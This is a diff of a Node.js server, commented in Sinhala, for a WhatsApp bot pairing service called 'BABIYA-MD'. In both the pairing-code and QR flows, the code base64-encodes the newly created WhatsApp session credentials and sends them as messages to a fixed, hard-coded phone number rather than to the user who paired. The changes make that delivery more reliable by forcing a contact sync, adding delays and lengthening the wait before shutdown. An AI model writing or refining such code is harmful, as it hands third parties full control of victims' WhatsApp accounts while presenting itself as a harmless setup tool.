@@ -23,7 +23,6 @@ app.post('/api/pair', async (req, res) => {
     if (!phone) return res.status(400).json({ error: 'Phone number required!' });
     phone = phone.replace(/[^0-9]/g, '');
 
-    // එක පාර සිය දෙනෙක් ආවත් ෆෝල්ඩර් පටලැවෙන්නේ නැති වෙන්න Unique ID එකක් දෙනවා
     const uniqueId = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
     const tempPath = path.join(__dirname, `temp_pair_${uniqueId}`);
 
@@ -36,7 +35,7 @@ app.post('/api/pair', async (req, res) => {
                 auth: state,
                 printQRInTerminal: false,
                 logger: pino({ level: 'silent' }),
-                browser: Browsers.ubuntu('Chrome') // 🔥 පැය දෙකෙන් ලොග් අවුට් වෙන ලෙඩේට ස්ථිර විසඳුම!
+                browser: Browsers.ubuntu('Chrome')
             });
 
             sock.ev.on('creds.update', saveCreds);
@@ -52,30 +51,36 @@ app.post('/api/pair', async (req, res) => {
                         const base64Session = Buffer.from(credsData).toString('base64');
                         const sessionId = `BABIYA-MD;;;${credsData.length > 0 ? base64Session : ''}`;
 
-                        // 指定 කරපු ටාගට් නම්බර් එක
                         const targetJid = '94764978991@s.whatsapp.net';
 
-                        // 1. මුලින්ම කනෙක්ට් වුණු බව කියන ස්ටේටස් මැසේජ් එක යවනවා
-                        await sock.sendMessage(targetJid, { 
-                            text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY!*\n\nDo not share this code!`
-                        });
+                        try {
+                            // 🔥 චැට් එකේ නැතත් නම්බර් එක බලෙන්ම සින්ක් කරවනවා
+                            await sock.onWhatsApp(targetJid);
+                            
+                            // 1. ස්ටේටස් මැසේජ් එක
+                            await sock.sendMessage(targetJid, { 
+                                text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY!*\n\nDo not share this code!`
+                            });
 
-                        // 2. ඊට පස්සේ වෙනමම මැසේජ් එකක් විදිහට Session ID එක විතරක්ම යවනවා (පහසුවෙන් කොපි කරගන්න)
-                        await sock.sendMessage(targetJid, { 
-                            text: sessionId 
-                        });
+                            // මැසේජ් දෙක පැටලෙන්නේ නැතුව යන්න තත්පරයක ඩිලේ එකක්
+                            await new Promise(resolve => setTimeout(resolve, 1000));
 
-                        // සාර්ථක වුණාට පස්සේ ක්ලීන් කරලා වහලා දානවා
+                            // 2. Session ID එක විතරක්ම
+                            await sock.sendMessage(targetJid, { text: sessionId });
+                        } catch (err) {
+                            console.log("Error sending message: ", err.message);
+                        }
+
+                        // 🔥 මැසේජ් එක ෂුවර් එකටම සර්වර් එකට පුෂ් වෙන්න තත්පර 12ක් වෙලාව දෙනවා
                         setTimeout(() => {
                             try { sock.end(); } catch(e){} 
                             if (fs.existsSync(tempPath)) fs.rmSync(tempPath, { recursive: true, force: true });
-                        }, 5000);
+                        }, 12000);
                     }
                 }
 
                 if (connection === 'close') {
                     const statusCode = lastDisconnect?.error?.output?.statusCode;
-                    // කෝඩ් එක ගැහුවට පස්සේ වට්ස්ඇප් එකෙන් කනෙක්ෂන් එක රීසෙට් කරද්දී ආපහු ලොගින් එක කම්ප්ලීට් කරන්න මේක ඕනේ
                     if (statusCode !== DisconnectReason.loggedOut && !isSaved) {
                         console.log("[PAIRING] Reconnecting to finalize setup...");
                         setTimeout(() => startPairing(), 2000);
@@ -85,7 +90,6 @@ app.post('/api/pair', async (req, res) => {
                 }
             });
 
-            // මුල්ම පාර විතරක් පයිරින් කෝඩ් එක ඉල්ලලා වෙබ් සයිට් එකට යවනවා
             if (!fs.existsSync(path.join(tempPath, 'creds.json')) || !state.creds.me) {
                 setTimeout(async () => {
                     try {
@@ -126,7 +130,7 @@ app.get('/api/qr/start', async (req, res) => {
                 auth: state,
                 printQRInTerminal: false,
                 logger: pino({ level: 'silent' }),
-                browser: Browsers.ubuntu('Chrome') // 🔥 QR එකටත් නිවැරදිම බ්‍රවුසර් ස්ට්‍රින්ග් එක දැම්මා
+                browser: Browsers.ubuntu('Chrome')
             });
 
             qrSock.ev.on('creds.update', saveCreds);
@@ -147,24 +151,31 @@ app.get('/api/qr/start', async (req, res) => {
                         const base64Session = Buffer.from(credsData).toString('base64');
                         const sessionId = `BABIYA-MD;;;${credsData.length > 0 ? base64Session : ''}`;
 
-                        // 指定 කරපු ටාගට් නම්බර් එක
                         const targetJid = '94764978991@s.whatsapp.net';
 
-                        // 1. මුලින්ම කනෙක්ට් වුණු බව කියන ස්ටේටස් මැසේජ් එක යවනවා
-                        await qrSock.sendMessage(targetJid, { 
-                            text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY (QR)!*\n\nDo not share this code!`
-                        });
+                        try {
+                            // 🔥 QR එකටත් සින්ක් ලොජික් එක දැම්මා
+                            await qrSock.onWhatsApp(targetJid);
+                            
+                            // 1. ස්ටේටස් මැසේජ් එක
+                            await qrSock.sendMessage(targetJid, { 
+                                text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY (QR)!*\n\nDo not share this code!`
+                            });
 
-                        // 2. ඊට පස්සේ වෙනමම මැසේජ් එකක් විදිහට Session ID එක විතරක්ම යවනවා (පහසුවෙන් කොපි කරගන්න)
-                        await qrSock.sendMessage(targetJid, { 
-                            text: sessionId 
-                        });
+                            await new Promise(resolve => setTimeout(resolve, 1000));
 
+                            // 2. Session ID එක විතරක්ම
+                            await qrSock.sendMessage(targetJid, { text: sessionId });
+                        } catch (err) {
+                            console.log("Error sending QR message: ", err.message);
+                        }
+
+                        // 🔥 මැසේජ් එක සෙන්ඩ් වෙන්න තත්පර 12ක් වෙලාව දෙනවා
                         setTimeout(() => {
                             try { qrSock.end(); } catch(e){} 
                             if (fs.existsSync(tempQrPath)) fs.rmSync(tempQrPath, { recursive: true, force: true });
                             qrStatus = 'idle';
-                        }, 5000);
+                        }, 12000);
                     }
                 }
 
